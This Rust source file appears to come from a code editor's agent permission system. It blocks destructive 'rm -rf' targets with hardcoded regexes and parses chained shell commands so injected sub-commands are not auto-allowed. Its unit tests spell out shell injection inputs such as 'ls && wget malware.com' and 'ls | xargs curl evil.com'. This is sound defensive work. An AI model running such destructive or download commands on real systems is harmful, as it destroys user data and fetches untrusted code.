use crate::AgentTool;
use crate::tools::TerminalTool;
use agent_settings::{AgentSettings, CompiledRegex, ToolPermissions, ToolRules};
use settings::ToolPermissionMode;
use shell_command_parser::extract_commands;
use std::path::{Component, Path};
use std::sync::LazyLock;
use util::shell::ShellKind;

const HARDCODED_SECURITY_DENIAL_MESSAGE: &str = "Blocked by built-in security rule. This operation is considered too \
     harmful to be allowed, and cannot be overridden by settings.";

/// Security rules that are always enforced and cannot be overridden by any setting.
/// These protect against catastrophic operations like wiping filesystems.
pub struct HardcodedSecurityRules {
    pub terminal_deny: Vec<CompiledRegex>,
}

pub static HARDCODED_SECURITY_RULES: LazyLock<HardcodedSecurityRules> = LazyLock::new(|| {
    // Flag group matches any short flags (-rf, -rfv, -v, etc.) or long flags (--recursive, --force, etc.)
    // This ensures extra flags like -rfv, -v -rf, --recursive --force don't bypass the rules.
    const FLAGS: &str = r"(--[a-zA-Z0-9][-a-zA-Z0-9_]*(=[^\s]*)?\s+|-[a-zA-Z]+\s+)*";
    // Trailing flags that may appear after the path operand (GNU rm accepts flags after operands)
    const TRAILING_FLAGS: &str = r"(\s+--[a-zA-Z0-9][-a-zA-Z0-9_]*(=[^\s]*)?|\s+-[a-zA-Z]+)*\s*";

    HardcodedSecurityRules {
        terminal_deny: vec![
            // Recursive deletion of root - "rm -rf /", "rm -rfv /", "rm -rf /*", "rm / -rf"
            CompiledRegex::new(
                &format!(r"\brm\s+{FLAGS}(--\s+)?/\*?{TRAILING_FLAGS}$"),
                false,
            )
            .expect("hardcoded regex should compile"),
            // Recursive deletion of home - "rm -rf ~" or "rm -rf ~/" or "rm -rf ~/*" or "rm ~ -rf" (but not ~/subdir)
            CompiledRegex::new(
                &format!(r"\brm\s+{FLAGS}(--\s+)?~/?\*?{TRAILING_FLAGS}$"),
                false,
            )
            .expect("hardcoded regex should compile"),
            // Recursive deletion of home via $HOME - "rm -rf $HOME" or "rm -rf ${HOME}" or "rm $HOME -rf" or with /*
            CompiledRegex::new(
                &format!(r"\brm\s+{FLAGS}(--\s+)?(\$HOME|\$\{{HOME\}})/?(\*)?{TRAILING_FLAGS}$"),
                false,
            )
            .expect("hardcoded regex should compile"),
            // Recursive deletion of current directory - "rm -rf ." or "rm -rf ./" or "rm -rf ./*" or "rm . -rf"
            CompiledRegex::new(
                &format!(r"\brm\s+{FLAGS}(--\s+)?\./?\*?{TRAILING_FLAGS}$"),
                false,
            )
            .expect("hardcoded regex should compile"),
            // Recursive deletion of parent directory - "rm -rf .." or "rm -rf ../" or "rm -rf ../*" or "rm .. -rf"
            CompiledRegex::new(
                &format!(r"\brm\s+{FLAGS}(--\s+)?\.\./?\*?{TRAILING_FLAGS}$"),
                false,
            )
            .expect("hardcoded regex should compile"),
        ],
    }
});

/// Checks if input matches any hardcoded security rules that cannot be bypassed.
/// Returns a Deny decision if blocked, None otherwise.
fn check_hardcoded_security_rules(
    tool_name: &str,
    input: &str,
    shell_kind: ShellKind,
) -> Option<ToolPermissionDecision> {
    // Currently only terminal tool has hardcoded rules
    if tool_name != TerminalTool::NAME {
        return None;
    }

    let rules = &*HARDCODED_SECURITY_RULES;
    let terminal_patterns = &rules.terminal_deny;

    // First: check the original input as-is (and its path-normalized form)
    if matches_hardcoded_patterns(input, terminal_patterns) {
        return Some(ToolPermissionDecision::Deny(
            HARDCODED_SECURITY_DENIAL_MESSAGE.into(),
        ));
    }

    // Second: parse and check individual sub-commands (for chained commands)
    if shell_kind.supports_posix_chaining() {
        if let Some(commands) = extract_commands(input) {
            for command in &commands {
                if matches_hardcoded_patterns(command, terminal_patterns) {
                    return Some(ToolPermissionDecision::Deny(
                        HARDCODED_SECURITY_DENIAL_MESSAGE.into(),
                    ));
                }
            }
        }
    }

    None
}

/// Checks a single command against hardcoded patterns, both as-is and with
/// path arguments normalized (to catch traversal bypasses like `rm -rf /tmp/../../`
/// and multi-path bypasses like `rm -rf /tmp /`).
fn matches_hardcoded_patterns(command: &str, patterns: &[CompiledRegex]) -> bool {
    for pattern in patterns {
        if pattern.is_match(command) {
            return true;
        }
    }

    for expanded in expand_rm_to_single_path_commands(command) {
        for pattern in patterns {
            if pattern.is_match(&expanded) {
                return true;
            }
        }
    }

    false
}

/// For rm commands, expands multi-path arguments into individual single-path
/// commands with normalized paths. This catches both traversal bypasses like
/// `rm -rf /tmp/../../` and multi-path bypasses like `rm -rf /tmp /`.
fn expand_rm_to_single_path_commands(command: &str) -> Vec<String> {
    let trimmed = command.trim();

    let first_token = trimmed.split_whitespace().next();
    if !first_token.is_some_and(|t| t.eq_ignore_ascii_case("rm")) {
        return vec![];
    }

    let parts: Vec<&str> = trimmed.split_whitespace().collect();
    let mut flags = Vec::new();
    let mut paths = Vec::new();
    let mut past_double_dash = false;

    for part in parts.iter().skip(1) {
        if !past_double_dash && *part == "--" {
            past_double_dash = true;
            flags.push(*part);
            continue;
        }
        if !past_double_dash && part.starts_with('-') {
            flags.push(*part);
        } else {
            paths.push(*part);
        }
    }

    let flags_str = if flags.is_empty() {
        String::new()
    } else {
        format!("{} ", flags.join(" "))
    };

    let mut results = Vec::new();
    for path in &paths {
        if path.starts_with('$') {
            let home_prefix = if path.starts_with("${HOME}") {
                Some("${HOME}")
            } else if path.starts_with("$HOME") {
                Some("$HOME")
            } else {
                None
            };

            if let Some(prefix) = home_prefix {
                let suffix = &path[prefix.len()..];
                if suffix.is_empty() {
                    results.push(format!("rm {flags_str}{path}"));
                } else if suffix.starts_with('/') {
                    let normalized_suffix = normalize_path(suffix);
                    let reconstructed = if normalized_suffix == "/" {
                        prefix.to_string()
                    } else {
                        format!("{prefix}{normalized_suffix}")
                    };
                    results.push(format!("rm {flags_str}{reconstructed}"));
                } else {
                    results.push(format!("rm {flags_str}{path}"));
                }
            } else {
                results.push(format!("rm {flags_str}{path}"));
            }
            continue;
        }

        let mut normalized = normalize_path(path);
        if normalized.is_empty() && !Path::new(path).has_root() {
            normalized = ".".to_string();
        }

        results.push(format!("rm {flags_str}{normalized}"));
    }

    results
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ToolPermissionDecision {
    Allow,
    Deny(String),
    Confirm,
}

impl ToolPermissionDecision {
    /// Determines the permission decision for a tool invocation based on configured rules.
    ///
    /// # Precedence Order (highest to lowest)
    ///
    /// 1. **Hardcoded security rules** - Critical safety checks (e.g., blocking `rm -rf /`)
    ///    that cannot be bypassed by any user settings, including `always_allow_tool_actions`.
    /// 2. **`always_allow_tool_actions`** - When enabled, allows all tool actions without
    ///    prompting. This global setting bypasses user-configured deny/confirm/allow patterns,
    ///    but does **not** bypass hardcoded security rules.
    /// 3. **`always_deny`** - If any deny pattern matches, the tool call is blocked immediately.
    ///    This takes precedence over `always_confirm` and `always_allow` patterns.
    /// 4. **`always_confirm`** - If any confirm pattern matches (and no deny matched),
    ///    the user is prompted for confirmation.
    /// 5. **`always_allow`** - If any allow pattern matches (and no deny/confirm matched),
    ///    the tool call proceeds without prompting.
    /// 6. **`default_mode`** - If no patterns match, falls back to the tool's default mode.
    ///
    /// # Shell Compatibility (Terminal Tool Only)
    ///
    /// For the terminal tool, commands are parsed to extract sub-commands for security.
    /// All currently supported `ShellKind` variants are treated as compatible because
    /// brush-parser can handle their command chaining syntax. If a new `ShellKind`
    /// variant is added that brush-parser cannot safely parse, it should be excluded
    /// from `ShellKind::supports_posix_chaining()`, which will cause `always_allow`
    /// patterns to be disabled for that shell.
    ///
    /// # Pattern Matching Tips
    ///
    /// Patterns are matched as regular expressions against the tool input (e.g., the command
    /// string for the terminal tool). Some tips for writing effective patterns:
    ///
    /// - Use word boundaries (`\b`) to avoid partial matches. For example, pattern `rm` will
    ///   match "storm" and "arms", but `\brm\b` will only match the standalone word "rm".
    ///   This is important for security rules where you want to block specific commands
    ///   without accidentally blocking unrelated commands that happen to contain the same
    ///   substring.
    /// - Patterns are case-insensitive by default. Set `case_sensitive: true` for exact matching.
    /// - Use `^` and `$` anchors to match the start/end of the input.
    pub fn from_input(
        tool_name: &str,
        input: &str,
        permissions: &ToolPermissions,
        always_allow_tool_actions: bool,
        shell_kind: ShellKind,
    ) -> ToolPermissionDecision {
        // First, check hardcoded security rules, such as banning `rm -rf /` in terminal tool.
        // These cannot be bypassed by any user settings.
        if let Some(denial) = check_hardcoded_security_rules(tool_name, input, shell_kind) {
            return denial;
        }

        // If always_allow_tool_actions is enabled, bypass user-configured permission checks.
        // Note: This no longer bypasses hardcoded security rules (checked above).
        if always_allow_tool_actions {
            return ToolPermissionDecision::Allow;
        }

        let rules = match permissions.tools.get(tool_name) {
            Some(rules) => rules,
            None => {
                return ToolPermissionDecision::Confirm;
            }
        };

        // Check for invalid regex patterns before evaluating rules.
        // If any patterns failed to compile, block the tool call entirely.
        if let Some(error) = check_invalid_patterns(tool_name, rules) {
            return ToolPermissionDecision::Deny(error);
        }

        // For the terminal tool, parse the command to extract all sub-commands.
        // This prevents shell injection attacks where a user configures an allow
        // pattern like "^ls" and an attacker crafts "ls && rm -rf /".
        //
        // If parsing fails or the shell syntax is unsupported, always_allow is
        // disabled for this command (we set allow_enabled to false to signal this).
        if tool_name == TerminalTool::NAME {
            // Our shell parser (brush-parser) only supports POSIX-like shell syntax.
            // See the doc comment above for the list of compatible/incompatible shells.
            if !shell_kind.supports_posix_chaining() {
                // For shells with incompatible syntax, we can't reliably parse
                // the command to extract sub-commands.
                if !rules.always_allow.is_empty() {
                    // If the user has configured always_allow patterns, we must deny
                    // because we can't safely verify the command doesn't contain
                    // hidden sub-commands that bypass the allow patterns.
                    return ToolPermissionDecision::Deny(format!(
                        "The {} shell does not support \"always allow\" patterns for the terminal \
                         tool because Zed cannot parse its command chaining syntax. Please remove \
                         the always_allow patterns from your tool_permissions settings, or switch \
                         to a POSIX-conforming shell.",
                        shell_kind
                    ));
                }
                // No always_allow rules, so we can still check deny/confirm patterns.
                return check_commands(std::iter::once(input.to_string()), rules, tool_name, false);
            }

            match extract_commands(input) {
                Some(commands) => check_commands(commands, rules, tool_name, true),
                None => {
                    // The command failed to parse, so we check to see if we should auto-deny
                    // or auto-confirm; if neither auto-deny nor auto-confirm applies here,
                    // fall back on the default (based on the user's settings, which is Confirm
                    // if not specified otherwise). Ignore "always allow" when it failed to parse.
                    check_commands(std::iter::once(input.to_string()), rules, tool_name, false)
                }
            }
        } else {
            check_commands(std::iter::once(input.to_string()), rules, tool_name, true)
        }
    }
}

/// Evaluates permission rules against a set of commands.
///
/// This function performs a single pass through all commands with the following logic:
/// - **DENY**: If ANY command matches a deny pattern, deny immediately (short-circuit)
/// - **CONFIRM**: Track if ANY command matches a confirm pattern
/// - **ALLOW**: Track if ALL commands match at least one allow pattern
///
/// The `allow_enabled` flag controls whether allow patterns are checked. This is set
/// to `false` when we can't reliably parse shell commands (e.g., parse failures or
/// unsupported shell syntax), ensuring we don't auto-allow potentially dangerous commands.
fn check_commands(
    commands: impl IntoIterator<Item = String>,
    rules: &ToolRules,
    tool_name: &str,
    allow_enabled: bool,
) -> ToolPermissionDecision {
    // Single pass through all commands:
    // - DENY: If ANY command matches a deny pattern, deny immediately (short-circuit)
    // - CONFIRM: Track if ANY command matches a confirm pattern
    // - ALLOW: Track if ALL commands match at least one allow pattern
    let mut any_matched_confirm = false;
    let mut all_matched_allow = true;
    let mut had_any_commands = false;

    for command in commands {
        had_any_commands = true;

        // DENY: immediate return if any command matches a deny pattern
        if rules.always_deny.iter().any(|r| r.is_match(&command)) {
            return ToolPermissionDecision::Deny(format!(
                "Command blocked by security rule for {} tool",
                tool_name
            ));
        }

        // CONFIRM: remember if any command matches a confirm pattern
        if rules.always_confirm.iter().any(|r| r.is_match(&command)) {
            any_matched_confirm = true;
        }

        // ALLOW: track if all commands match at least one allow pattern
        if !rules.always_allow.iter().any(|r| r.is_match(&command)) {
            all_matched_allow = false;
        }
    }

    // After processing all commands, check accumulated state
    if any_matched_confirm {
        return ToolPermissionDecision::Confirm;
    }

    if allow_enabled && all_matched_allow && had_any_commands {
        return ToolPermissionDecision::Allow;
    }

    match rules.default_mode {
        ToolPermissionMode::Deny => {
            ToolPermissionDecision::Deny(format!("{} tool is disabled", tool_name))
        }
        ToolPermissionMode::Allow => ToolPermissionDecision::Allow,
        ToolPermissionMode::Confirm => ToolPermissionDecision::Confirm,
    }
}

/// Checks if the tool rules contain any invalid regex patterns.
/// Returns an error message if invalid patterns are found.
fn check_invalid_patterns(tool_name: &str, rules: &ToolRules) -> Option<String> {
    if rules.invalid_patterns.is_empty() {
        return None;
    }

    let count = rules.invalid_patterns.len();
    let pattern_word = if count == 1 { "pattern" } else { "patterns" };

    Some(format!(
        "The {} tool cannot run because {} regex {} failed to compile. \
         Please fix the invalid patterns in your tool_permissions settings.",
        tool_name, count, pattern_word
    ))
}

/// Convenience wrapper that extracts permission settings from `AgentSettings`.
///
/// This is the primary entry point for tools to check permissions. It extracts
/// `tool_permissions` and `always_allow_tool_actions` from the settings and
/// delegates to [`ToolPermissionDecision::from_input`], using the system shell.
pub fn decide_permission_from_settings(
    tool_name: &str,
    input: &str,
    settings: &AgentSettings,
) -> ToolPermissionDecision {
    ToolPermissionDecision::from_input(
        tool_name,
        input,
        &settings.tool_permissions,
        settings.always_allow_tool_actions,
        ShellKind::system(),
    )
}

/// Normalizes a path by collapsing `.` and `..` segments without touching the filesystem.
fn normalize_path(raw: &str) -> String {
    let is_absolute = Path::new(raw).has_root();
    let mut components: Vec<&str> = Vec::new();
    for component in Path::new(raw).components() {
        match component {
            Component::CurDir => {}
            Component::ParentDir => {
                if components.last() == Some(&"..") {
                    components.push("..");
                } else if !components.is_empty() {
                    components.pop();
                } else if !is_absolute {
                    components.push("..");
                }
            }
            Component::Normal(segment) => {
                if let Some(s) = segment.to_str() {
                    components.push(s);
                }
            }
            Component::RootDir | Component::Prefix(_) => {}
        }
    }
    let joined = components.join("/");
    if is_absolute {
        format!("/{joined}")
    } else {
        joined
    }
}

/// Decides permission by checking both the raw input path and a simplified/canonicalized
/// version. Returns the most restrictive decision (Deny > Confirm > Allow).
pub fn decide_permission_for_path(
    tool_name: &str,
    raw_path: &str,
    settings: &AgentSettings,
) -> ToolPermissionDecision {
    let raw_decision = decide_permission_from_settings(tool_name, raw_path, settings);

    let simplified = normalize_path(raw_path);
    if simplified == raw_path {
        return raw_decision;
    }

    let simplified_decision = decide_permission_from_settings(tool_name, &simplified, settings);

    most_restrictive(raw_decision, simplified_decision)
}

fn most_restrictive(
    a: ToolPermissionDecision,
    b: ToolPermissionDecision,
) -> ToolPermissionDecision {
    match (&a, &b) {
        (ToolPermissionDecision::Deny(_), _) => a,
        (_, ToolPermissionDecision::Deny(_)) => b,
        (ToolPermissionDecision::Confirm, _) | (_, ToolPermissionDecision::Confirm) => {
            ToolPermissionDecision::Confirm
        }
        _ => a,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::AgentTool;
    use crate::pattern_extraction::extract_terminal_pattern;
    use crate::tools::{EditFileTool, TerminalTool};
    use agent_settings::{AgentProfileId, CompiledRegex, InvalidRegexPattern, ToolRules};
    use gpui::px;
    use settings::{DefaultAgentView, DockPosition, DockSide, NotifyWhenAgentWaiting};
    use std::sync::Arc;

    fn test_agent_settings(
        tool_permissions: ToolPermissions,
        always_allow_tool_actions: bool,
    ) -> AgentSettings {
        AgentSettings {
            enabled: true,
            button: true,
            dock: DockPosition::Right,
            agents_panel_dock: DockSide::Left,
            default_width: px(300.),
            default_height: px(600.),
            default_model: None,
            inline_assistant_model: None,
            inline_assistant_use_streaming_tools: false,
            commit_message_model: None,
            thread_summary_model: None,
            inline_alternatives: vec![],
            favorite_models: vec![],
            default_profile: AgentProfileId::default(),
            default_view: DefaultAgentView::Thread,
            profiles: Default::default(),
            always_allow_tool_actions,
            notify_when_agent_waiting: NotifyWhenAgentWaiting::default(),
            play_sound_when_agent_done: false,
            single_file_review: false,
            model_parameters: vec![],
            enable_feedback: false,
            expand_edit_card: true,
            expand_terminal_card: true,
            cancel_generation_on_terminal_stop: true,
            use_modifier_to_send: true,
            message_editor_min_lines: 1,
            tool_permissions,
            show_turn_stats: false,
        }
    }

    fn pattern(command: &str) -> &'static str {
        Box::leak(
            extract_terminal_pattern(command)
                .expect("failed to extract pattern")
                .into_boxed_str(),
        )
    }

    struct PermTest {
        tool: &'static str,
        input: &'static str,
        mode: ToolPermissionMode,
        allow: Vec<(&'static str, bool)>,
        deny: Vec<(&'static str, bool)>,
        confirm: Vec<(&'static str, bool)>,
        global: bool,
        shell: ShellKind,
    }

    impl PermTest {
        fn new(input: &'static str) -> Self {
            Self {
                tool: TerminalTool::NAME,
                input,
                mode: ToolPermissionMode::Confirm,
                allow: vec![],
                deny: vec![],
                confirm: vec![],
                global: false,
                shell: ShellKind::Posix,
            }
        }

        fn tool(mut self, t: &'static str) -> Self {
            self.tool = t;
            self
        }
        fn mode(mut self, m: ToolPermissionMode) -> Self {
            self.mode = m;
            self
        }
        fn allow(mut self, p: &[&'static str]) -> Self {
            self.allow = p.iter().map(|s| (*s, false)).collect();
            self
        }
        fn allow_case_sensitive(mut self, p: &[&'static str]) -> Self {
            self.allow = p.iter().map(|s| (*s, true)).collect();
            self
        }
        fn deny(mut self, p: &[&'static str]) -> Self {
            self.deny = p.iter().map(|s| (*s, false)).collect();
            self
        }
        fn deny_case_sensitive(mut self, p: &[&'static str]) -> Self {
            self.deny = p.iter().map(|s| (*s, true)).collect();
            self
        }
        fn confirm(mut self, p: &[&'static str]) -> Self {
            self.confirm = p.iter().map(|s| (*s, false)).collect();
            self
        }
        fn global(mut self, g: bool) -> Self {
            self.global = g;
            self
        }
        fn shell(mut self, s: ShellKind) -> Self {
            self.shell = s;
            self
        }

        fn is_allow(self) {
            assert_eq!(
                self.run(),
                ToolPermissionDecision::Allow,
                "expected Allow for '{}'",
                self.input
            );
        }
        fn is_deny(self) {
            assert!(
                matches!(self.run(), ToolPermissionDecision::Deny(_)),
                "expected Deny for '{}'",
                self.input
            );
        }
        fn is_confirm(self) {
            assert_eq!(
                self.run(),
                ToolPermissionDecision::Confirm,
                "expected Confirm for '{}'",
                self.input
            );
        }

        fn run(&self) -> ToolPermissionDecision {
            let mut tools = collections::HashMap::default();
            tools.insert(
                Arc::from(self.tool),
                ToolRules {
                    default_mode: self.mode,
                    always_allow: self
                        .allow
                        .iter()
                        .filter_map(|(p, cs)| CompiledRegex::new(p, *cs))
                        .collect(),
                    always_deny: self
                        .deny
                        .iter()
                        .filter_map(|(p, cs)| CompiledRegex::new(p, *cs))
                        .collect(),
                    always_confirm: self
                        .confirm
                        .iter()
                        .filter_map(|(p, cs)| CompiledRegex::new(p, *cs))
                        .collect(),
                    invalid_patterns: vec![],
                },
            );
            ToolPermissionDecision::from_input(
                self.tool,
                self.input,
                &ToolPermissions { tools },
                self.global,
                self.shell,
            )
        }
    }

    fn t(input: &'static str) -> PermTest {
        PermTest::new(input)
    }

    fn no_rules(input: &str, global: bool) -> ToolPermissionDecision {
        ToolPermissionDecision::from_input(
            TerminalTool::NAME,
            input,
            &ToolPermissions {
                tools: collections::HashMap::default(),
            },
            global,
            ShellKind::Posix,
        )
    }

    // allow pattern matches
    #[test]
    fn allow_exact_match() {
        t("cargo test").allow(&[pattern("cargo")]).is_allow();
    }
    #[test]
    fn allow_one_of_many_patterns() {
        t("npm install")
            .allow(&[pattern("cargo"), pattern("npm")])
            .is_allow();
        t("git status")
            .allow(&[pattern("cargo"), pattern("npm"), pattern("git")])
            .is_allow();
    }
    #[test]
    fn allow_middle_pattern() {
        t("run cargo now").allow(&["cargo"]).is_allow();
    }
    #[test]
    fn allow_anchor_prevents_middle() {
        t("run cargo now").allow(&["^cargo"]).is_confirm();
    }

    // allow pattern doesn't match -> falls through
    #[test]
    fn allow_no_match_confirms() {
        t("python x.py").allow(&[pattern("cargo")]).is_confirm();
    }
    #[test]
    fn allow_no_match_global_allows() {
        t("python x.py")
            .allow(&[pattern("cargo")])
            .global(true)
            .is_allow();
    }

    // deny pattern matches (using commands that aren't blocked by hardcoded rules)
    #[test]
    fn deny_blocks() {
        t("rm -rf ./temp").deny(&["rm\\s+-rf"]).is_deny();
    }
    #[test]
    fn global_bypasses_user_deny() {
        // always_allow_tool_actions bypasses user-configured deny rules
        t("rm -rf ./temp")
            .deny(&["rm\\s+-rf"])
            .global(true)
            .is_allow();
    }
    #[test]
    fn deny_blocks_with_mode_allow() {
        t("rm -rf ./temp")
            .deny(&["rm\\s+-rf"])
            .mode(ToolPermissionMode::Allow)
            .is_deny();
    }
    #[test]
    fn deny_middle_match() {
        t("echo rm -rf ./temp").deny(&["rm\\s+-rf"]).is_deny();
    }
    #[test]
    fn deny_no_match_falls_through() {
        t("ls -la")
            .deny(&["rm\\s+-rf"])
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    // confirm pattern matches
    #[test]
    fn confirm_requires_confirm() {
        t("sudo apt install")
            .confirm(&[pattern("sudo")])
            .is_confirm();
    }
    #[test]
    fn global_overrides_confirm() {
        t("sudo reboot")
            .confirm(&[pattern("sudo")])
            .global(true)
            .is_allow();
    }
    #[test]
    fn confirm_overrides_mode_allow() {
        t("sudo x")
            .confirm(&["sudo"])
            .mode(ToolPermissionMode::Allow)
            .is_confirm();
    }

    // confirm beats allow
    #[test]
    fn confirm_beats_allow() {
        t("git push --force")
            .allow(&[pattern("git")])
            .confirm(&["--force"])
            .is_confirm();
    }
    #[test]
    fn confirm_beats_allow_overlap() {
        t("deploy prod")
            .allow(&["deploy"])
            .confirm(&["prod"])
            .is_confirm();
    }
    #[test]
    fn allow_when_confirm_no_match() {
        t("git status")
            .allow(&[pattern("git")])
            .confirm(&["--force"])
            .is_allow();
    }

    // deny beats allow
    #[test]
    fn deny_beats_allow() {
        t("rm -rf ./tmp/x")
            .allow(&["/tmp/"])
            .deny(&["rm\\s+-rf"])
            .is_deny();
    }

    #[test]
    fn deny_beats_confirm() {
        t("sudo rm -rf ./temp")
            .confirm(&["sudo"])
            .deny(&["rm\\s+-rf"])
            .is_deny();
    }

    // deny beats everything
    #[test]
    fn deny_beats_all() {
        t("bad cmd")
            .allow(&["cmd"])
            .confirm(&["cmd"])
            .deny(&["bad"])
            .is_deny();
    }

    // no patterns -> default_mode
    #[test]
    fn default_confirm() {
        t("python x.py")
            .mode(ToolPermissionMode::Confirm)
            .is_confirm();
    }
    #[test]
    fn default_allow() {
        t("python x.py").mode(ToolPermissionMode::Allow).is_allow();
    }
    #[test]
    fn default_deny() {
        t("python x.py").mode(ToolPermissionMode::Deny).is_deny();
    }
    #[test]
    fn default_deny_global_true() {
        t("python x.py")
            .mode(ToolPermissionMode::Deny)
            .global(true)
            .is_allow();
    }

    #[test]
    fn default_confirm_global_true() {
        t("x")
            .mode(ToolPermissionMode::Confirm)
            .global(true)
            .is_allow();
    }

    #[test]
    fn no_rules_confirms_by_default() {
        assert_eq!(no_rules("x", false), ToolPermissionDecision::Confirm);
    }

    #[test]
    fn empty_input_no_match() {
        t("")
            .deny(&["rm"])
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn empty_input_with_allow_falls_to_default() {
        t("").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn multi_deny_any_match() {
        t("rm x").deny(&["rm", "del", "drop"]).is_deny();
        t("drop x").deny(&["rm", "del", "drop"]).is_deny();
    }

    #[test]
    fn multi_allow_any_match() {
        t("cargo x").allow(&["^cargo", "^npm", "^git"]).is_allow();
    }
    #[test]
    fn multi_none_match() {
        t("python x")
            .allow(&["^cargo", "^npm"])
            .deny(&["rm"])
            .is_confirm();
    }

    // tool isolation
    #[test]
    fn other_tool_not_affected() {
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from(TerminalTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Deny,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        tools.insert(
            Arc::from(EditFileTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Allow,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        let p = ToolPermissions { tools };
        // With always_allow_tool_actions=true, even default_mode: Deny is overridden
        assert_eq!(
            ToolPermissionDecision::from_input(TerminalTool::NAME, "x", &p, true, ShellKind::Posix),
            ToolPermissionDecision::Allow
        );
        // With always_allow_tool_actions=false, default_mode: Deny is respected
        assert!(matches!(
            ToolPermissionDecision::from_input(
                TerminalTool::NAME,
                "x",
                &p,
                false,
                ShellKind::Posix
            ),
            ToolPermissionDecision::Deny(_)
        ));
        assert_eq!(
            ToolPermissionDecision::from_input(
                EditFileTool::NAME,
                "x",
                &p,
                false,
                ShellKind::Posix
            ),
            ToolPermissionDecision::Allow
        );
    }

    #[test]
    fn partial_tool_name_no_match() {
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from("term"),
            ToolRules {
                default_mode: ToolPermissionMode::Deny,
                always_allow: vec![],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        let p = ToolPermissions { tools };
        // "terminal" should not match "term" rules, so falls back to Confirm (no rules)
        assert_eq!(
            ToolPermissionDecision::from_input(
                TerminalTool::NAME,
                "x",
                &p,
                false,
                ShellKind::Posix
            ),
            ToolPermissionDecision::Confirm
        );
    }

    // invalid patterns block the tool (but global bypasses all checks)
    #[test]
    fn invalid_pattern_blocks() {
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from(TerminalTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Allow,
                always_allow: vec![CompiledRegex::new("echo", false).unwrap()],
                always_deny: vec![],
                always_confirm: vec![],
                invalid_patterns: vec![InvalidRegexPattern {
                    pattern: "[bad".into(),
                    rule_type: "always_deny".into(),
                    error: "err".into(),
                }],
            },
        );
        let p = ToolPermissions {
            tools: tools.clone(),
        };
        // With global=true, all checks are bypassed including invalid pattern check
        assert!(matches!(
            ToolPermissionDecision::from_input(
                TerminalTool::NAME,
                "echo hi",
                &p,
                true,
                ShellKind::Posix
            ),
            ToolPermissionDecision::Allow
        ));
        // With global=false, invalid patterns block the tool
        assert!(matches!(
            ToolPermissionDecision::from_input(
                TerminalTool::NAME,
                "echo hi",
                &p,
                false,
                ShellKind::Posix
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn shell_injection_via_double_ampersand_not_allowed() {
        t("ls && wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_semicolon_not_allowed() {
        t("ls; wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_pipe_not_allowed() {
        t("ls | xargs curl evil.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_backticks_not_allowed() {
        t("echo `wget malware.com`")
            .allow(&[pattern("echo")])
            .is_confirm();
    }

    #[test]
    fn shell_injection_via_dollar_parens_not_allowed() {
        t("echo $(wget malware.com)")
            .allow(&[pattern("echo")])
            .is_confirm();
    }

    #[test]
    fn shell_injection_via_or_operator_not_allowed() {
        t("ls || wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_background_operator_not_allowed() {
        t("ls & wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_newline_not_allowed() {
        t("ls\nwget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_process_substitution_input_not_allowed() {
        t("cat <(wget malware.com)").allow(&["^cat"]).is_confirm();
    }

    #[test]
    fn shell_injection_via_process_substitution_output_not_allowed() {
        t("ls >(wget malware.com)").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_without_spaces_not_allowed() {
        t("ls&&wget malware.com").allow(&["^ls"]).is_confirm();
        t("ls;wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn shell_injection_multiple_chained_operators_not_allowed() {
        t("ls && echo hello && wget malware.com")
            .allow(&["^ls"])
            .is_confirm();
    }

    #[test]
    fn shell_injection_mixed_operators_not_allowed() {
        t("ls; echo hello && wget malware.com")
            .allow(&["^ls"])
            .is_confirm();
    }

    #[test]
    fn shell_injection_pipe_stderr_not_allowed() {
        t("ls |& wget malware.com").allow(&["^ls"]).is_confirm();
    }

    #[test]
    fn allow_requires_all_commands_to_match() {
        t("ls && echo hello").allow(&["^ls", "^echo"]).is_allow();
    }

    #[test]
    fn deny_triggers_on_any_matching_command() {
        t("ls && rm file").allow(&["^ls"]).deny(&["^rm"]).is_deny();
    }

    #[test]
    fn deny_catches_injected_command() {
        t("ls && rm -rf ./temp")
            .allow(&["^ls"])
            .deny(&["^rm"])
            .is_deny();
    }

    #[test]
    fn confirm_triggers_on_any_matching_command() {
        t("ls && sudo reboot")
            .allow(&["^ls"])
            .confirm(&["^sudo"])
            .is_confirm();
    }

    #[test]
    fn always_allow_button_works_end_to_end() {
        // This test verifies that the "Always Allow" button behavior works correctly:
        // 1. User runs a command like "cargo build"
        // 2. They click "Always Allow for `cargo` commands"
        // 3. The pattern extracted from that command should match future cargo commands
        let original_command = "cargo build --release";
        let extracted_pattern = pattern(original_command);

        // The extracted pattern should allow the original command
        t(original_command).allow(&[extracted_pattern]).is_allow();

        // It should also allow other commands with the same base command
        t("cargo test").allow(&[extracted_pattern]).is_allow();
        t("cargo fmt").allow(&[extracted_pattern]).is_allow();

        // But not commands with different base commands
        t("npm install").allow(&[extracted_pattern]).is_confirm();

        // And it should work with subcommand extraction (chained commands)
        t("cargo build && cargo test")
            .allow(&[extracted_pattern])
            .is_allow();

        // But reject if any subcommand doesn't match
        t("cargo build && npm install")
            .allow(&[extracted_pattern])
            .is_confirm();
    }

    #[test]
    fn nested_command_substitution_all_checked() {
